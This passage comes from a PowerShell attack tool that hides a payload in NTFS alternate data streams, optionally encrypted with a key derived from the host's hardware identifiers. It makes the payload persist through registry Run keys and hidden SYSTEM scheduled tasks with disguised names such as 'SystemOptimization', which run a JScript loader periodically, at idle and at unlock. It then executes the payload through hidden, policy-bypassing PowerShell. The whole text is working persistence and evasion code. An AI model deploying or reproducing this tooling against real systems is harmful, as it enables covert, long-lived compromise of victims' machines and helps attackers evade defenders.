        Register-ScheduledTask -TaskName $TaskName `
            -Action $action `
            -Trigger $triggers `
            -Settings $settings `
            -Principal $principal `
            -Force | Out-Null

        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
        Write-Verbose "Scheduled task created: $TaskName ($triggerSummary)"

        return @{
            TaskName          = $TaskName
            JScriptLoaderPath = $jsPath
            TriggerSummary    = $triggerSummary
        }
    }
    catch {
        Write-Error "Task creation failed: $_"
        return $null
    }
}

function Create-RegistryPersistence {
    <#
    .SYNOPSIS
        Creates registry Run key persistence with companion scheduled task.
        Registry Run keys handle logon/startup. A companion task handles
        periodic execution + cheeky triggers (OnIdle, OnUnlock) that
        registry can't do natively.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$HostPath,

        [Parameter(Mandatory)]
        [string]$StreamName,

        [string]$ValueName = 'SystemOptimization',

        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

        [int]$PeriodicMinutes = 5,
        [int]$JitterPercent = 20,

        [switch]$IsEncrypted
    )

    try {
        $adsFullPath = "${HostPath}:${StreamName}"

        # Build the registry value command
        # -W Hidden works from registry Run keys (Explorer.exe respects it)
        if ($IsEncrypted) {
            $regCmd = 'powershell.exe -NoP -W Hidden -EP Bypass -C "' +
                'function GHK{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;' +
                '[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' +
                'function Dec($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();' +
                '$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];' +
                '$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' +
                '$k=GHK;$e=gc ''' + $adsFullPath + ''' -Raw;IEX(Dec $e $k)"'
        } else {
            $regCmd = "powershell.exe -NoP -W Hidden -EP Bypass -C `"IEX(gc '$adsFullPath' -Raw)`""
        }

        $result = @{
            ValueName      = $ValueName
            Trigger        = $Trigger
            RegistryPaths  = @()
        }

        # --- Write registry Run keys for logon/startup triggers ---
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)

        if ($Trigger -contains 'AtLogOn') {
            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
            $result.RegistryPaths += $hkcuPath
            Write-Verbose "Registry Run key (HKCU/logon): $hkcuPath\$ValueName"
        }

        if ($Trigger -contains 'AtStartup') {
            if ($isAdmin) {
                $hklmPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
                Set-ItemProperty -Path $hklmPath -Name $ValueName -Value $regCmd -Force
                $result.RegistryPaths += $hklmPath
                Write-Verbose "Registry Run key (HKLM/startup): $hklmPath\$ValueName"
            } else {
                Write-Warning "AtStartup requires admin - writing HKCU instead (fires at logon)"
                if ($result.RegistryPaths -notcontains 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run') {
                    $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                    Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
                    $result.RegistryPaths += $hkcuPath
                }
            }
        }

        # If no logon/startup triggers, still write HKCU as baseline
        if ($result.RegistryPaths.Count -eq 0) {
            $hkcuPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Set-ItemProperty -Path $hkcuPath -Name $ValueName -Value $regCmd -Force
            $result.RegistryPaths += $hkcuPath
        }

        # --- Companion task for periodic + cheeky triggers ---
        # Registry Run keys only fire at logon/startup. A companion task
        # handles periodic interval, OnIdle, and OnUnlock — consistent
        # with task persistence behavior.
        $companionTaskName = if ($Randomize) {
            "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
        } else {
            "${ValueName}_Companion"
        }

        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted

        $hostDir = Split-Path $HostPath -Parent
        if (-not $hostDir -or -not (Test-Path $hostDir)) { $hostDir = $env:ProgramData }

        $jsFileName = if ($Randomize) {
            $prefixes = @('msupdate','windiag','perfmon_report','etw_session')
            $prefix  = $prefixes | Get-Random
            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
            "${prefix}_${suffix}.js"
        } else {
            "syshealth_companion.js"
        }

        $jsPath = Join-Path $hostDir $jsFileName
        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force

        $taskAction = New-ScheduledTaskAction -Execute "wscript.exe" `
            -Argument "//B //E:JScript `"$jsPath`""

        # Build companion triggers (periodic + cheeky)
        $jitterDelay = $null
        if ($JitterPercent -gt 0) {
            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
            $jitterDelay = New-TimeSpan -Minutes $jitterMinutes
        }

        $taskTriggers = @()
        # Periodic
        $tPeriodic = New-ScheduledTaskTrigger -Once `
            -At (Get-Date).AddMinutes(1) `
            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
            -RepetitionDuration (New-TimeSpan -Days 9999)
        if ($jitterDelay) { $tPeriodic.RandomDelay = $jitterDelay }
        $taskTriggers += $tPeriodic

        # OnIdle
        if ($Trigger -contains 'OnIdle') {
            $tIdle = New-CimInstance -CimClass (
                Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
            ) -ClientOnly
            $taskTriggers += $tIdle
        }
        # OnUnlock
        if ($Trigger -contains 'OnUnlock') {
            $tUnlock = New-CimInstance -CimClass (
                Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
            ) -Property @{ StateChange = [uint32]8 } -ClientOnly
            if ($jitterDelay) { $tUnlock.RandomDelay = "PT$($jitterDelay.TotalMinutes)M" }
            $taskTriggers += $tUnlock
        }

        $settingsParams = @{
            AllowStartIfOnBatteries    = $true
            DontStopIfGoingOnBatteries = $true
            Hidden                     = $true
        }
        if ($Trigger -contains 'OnIdle') {
            $settingsParams.IdleDuration   = New-TimeSpan -Minutes 10
            $settingsParams.IdleWaitTimeout = New-TimeSpan -Hours 1
        }
        $taskSettings = New-ScheduledTaskSettingsSet @settingsParams

        $taskPrincipal = New-ScheduledTaskPrincipal `
            -UserId "SYSTEM" `
            -LogonType ServiceAccount `
            -RunLevel Highest

        # SilentlyContinue: companion task requires admin — if not admin, registry Run key
        # still fires at logon; periodic/cheeky triggers just won't be available
        Register-ScheduledTask -TaskName $companionTaskName `
            -Action $taskAction `
            -Trigger $taskTriggers `
            -Settings $taskSettings `
            -Principal $taskPrincipal `
            -Force -ErrorAction SilentlyContinue | Out-Null

        $result.CompanionTaskName  = $companionTaskName
        $result.CompanionJScriptPath = $jsPath

        $triggerSummary = ($Trigger -join '+') + "+Periodic(${PeriodicMinutes}m)"
        if ($JitterPercent -gt 0) { $triggerSummary += "+Jitter(${JitterPercent}%)" }
        Write-Verbose "Registry persistence: $($result.RegistryPaths -join ' + ') + companion task $companionTaskName ($triggerSummary)"

        return $result
    }
    catch {
        Write-Error "Registry persistence failed: $_"
        return $null
    }
}

#endregion

#region Main Execution

# Handle payload input
if ($PayloadAtRuntime -and -not $Payload) {
    Write-Host "Enter payload (press Enter twice when done):" -ForegroundColor Cyan
    $lines = @()
    do {
        $line = Read-Host
        if ($line) { $lines += $line }
    } while ($line)
    $Payload = $lines -join "`n"
}

if (-not $Payload) {
    Write-Error "No payload specified. Use -Payload or -PayloadAtRuntime"
    exit 1
}

# Generate config
$config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
                              -ZwMode $ZeroWidthMode `
                              -ZwPrefix $HybridPrefix `
                              -UseDeepPlacement:$UseDeepPlacement `
                              -AttachToExisting:$AttachToExisting

Write-Verbose "Host: $($config.HostPath)"
Write-Verbose "Stream: $($config.StreamName)"
if ($ZeroWidthStreams) {
    Write-Warning "Zero-width stream - Codepoints: $($config.Codepoints)"
}

# Generate task name (for both GenerateOnly and normal execution)
$taskName = if ($Randomize) {
    "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
} else {
    "SystemOptimization"
}

# If GenerateOnly mode, return configuration and exit
if ($GenerateOnly) {
    # Convert stream name to escaped format for command generation
    $streamChars = $config.StreamName.ToCharArray()
    $streamNameEscaped = ($streamChars | ForEach-Object {
        "[char]0x{0:X4}" -f [int]$_
    }) -join '+'
    
    # Return configuration object
    return [PSCustomObject]@{
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $streamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $taskName
        Payload = $Payload
        PayloadEncrypted = $Encrypt.IsPresent
        PersistenceMethod = $Persist
        DecoysCount = $CreateDecoys
        ZeroWidthMode = $ZeroWidthMode
        HybridPrefix = $HybridPrefix
        Randomized = $Randomize.IsPresent
        DeepPlacement = $UseDeepPlacement.IsPresent
        AttachToExisting = $AttachToExisting.IsPresent
        Trigger = $Trigger
        PeriodicMinutes = $PeriodicMinutes
        JitterPercent = $JitterPercent
    }
}

# Normal execution path (not GenerateOnly)
# Create decoys
if ($CreateDecoys -gt 0) {
    Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
}

# Write payload
$adsPath = Write-ADSPayload -HostPath $config.HostPath `
                            -StreamName $config.StreamName `
                            -PayloadContent $Payload `
                            -EncryptPayload:$Encrypt

if (-not $adsPath) {
    Write-Error "Failed to create ADS"
    exit 1
}

# Create persistence
if ($Persist -ne 'none') {
    switch ($Persist) {
        'task' {
            $taskResult = Create-ScheduledTaskPersistence `
                -HostPath $config.HostPath `
                -StreamName $config.StreamName `
                -TaskName $taskName `
                -Trigger $Trigger `
                -PeriodicMinutes $PeriodicMinutes `
                -JitterPercent $JitterPercent `
                -IsEncrypted:$Encrypt

            if ($taskResult) {
                $taskName     = $taskResult.TaskName
                $jsLoaderPath = $taskResult.JScriptLoaderPath
                Write-Host "[+] Persistence: Scheduled Task '$taskName' ($($taskResult.TriggerSummary))" -ForegroundColor Green
                Write-Host "[+] JScript loader: $jsLoaderPath" -ForegroundColor Green
            } else {
                Write-Error "Failed to create scheduled task persistence"
            }
        }
        'registry' {
            $regResult = Create-RegistryPersistence `
                -HostPath $config.HostPath `
                -StreamName $config.StreamName `
                -ValueName $taskName `
                -Trigger $Trigger `
                -PeriodicMinutes $PeriodicMinutes `
                -JitterPercent $JitterPercent `
                -IsEncrypted:$Encrypt

            if ($regResult) {
                foreach ($rp in $regResult.RegistryPaths) {
                    Write-Host "[+] Persistence: Registry '$rp\$($regResult.ValueName)'" -ForegroundColor Green
                }
                if ($regResult.CompanionTaskName) {
                    Write-Host "[+] Companion task: $($regResult.CompanionTaskName) (periodic+cheeky triggers)" -ForegroundColor Green
                    Write-Host "[+] JScript loader: $($regResult.CompanionJScriptPath)" -ForegroundColor Green
                    $jsLoaderPath = $regResult.CompanionJScriptPath
                }
            } else {
                Write-Error "Failed to create registry persistence"
            }
        }
        'wmi' {
            Write-Warning "WMI persistence not implemented in this version"
        }
    }
}

# Save manifest (Linux only - not on Windows target)
if ($ManifestPath) {
    $payloadHash = (Get-FileHash -InputStream (
        [System.IO.MemoryStream]::new(
            [System.Text.Encoding]::UTF8.GetBytes($Payload)
        )) -Algorithm SHA256).Hash

    $entry = Create-ManifestEntry -TargetHost $env:COMPUTERNAME `
                                  -FilePath $config.HostPath `
                                  -StreamName $config.StreamName `
                                  -PayloadHash $payloadHash `
                                  -PersistenceMethod $Persist

    $entry | Add-Member -NotePropertyName 'Trigger' -NotePropertyValue ($Trigger -join ',')
    $entry | Add-Member -NotePropertyName 'PeriodicMinutes' -NotePropertyValue $PeriodicMinutes
    $entry | Add-Member -NotePropertyName 'JitterPercent' -NotePropertyValue $JitterPercent

    # Append JScript path for cleanup tracking
    if ($jsLoaderPath) {
        $entry | Add-Member -NotePropertyName 'JScriptLoaderPath' `
                            -NotePropertyValue $jsLoaderPath
    }

    # Registry-specific fields
    if ($regResult) {
        $entry | Add-Member -NotePropertyName 'RegistryPaths' -NotePropertyValue ($regResult.RegistryPaths -join ',')
        $entry | Add-Member -NotePropertyName 'RegistryValueName' -NotePropertyValue $regResult.ValueName
        if ($regResult.CompanionTaskName) {
            $entry | Add-Member -NotePropertyName 'CompanionTaskName' -NotePropertyValue $regResult.CompanionTaskName
        }
        if ($regResult.CompanionJScriptPath) {
            $entry | Add-Member -NotePropertyName 'CompanionJScriptPath' -NotePropertyValue $regResult.CompanionJScriptPath
        }
    }

    Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
    Write-Host "[+] Manifest saved: $ManifestPath" -ForegroundColor Green
}

# Execute
if (-not $NoExec) {
    Write-Verbose "Executing payload..."
    try {
        IEX $Payload
    } catch {
        Write-Error "Execution failed: $_"
    }
}

Write-Host "[+] Deployment complete" -ForegroundColor Green

#endregion
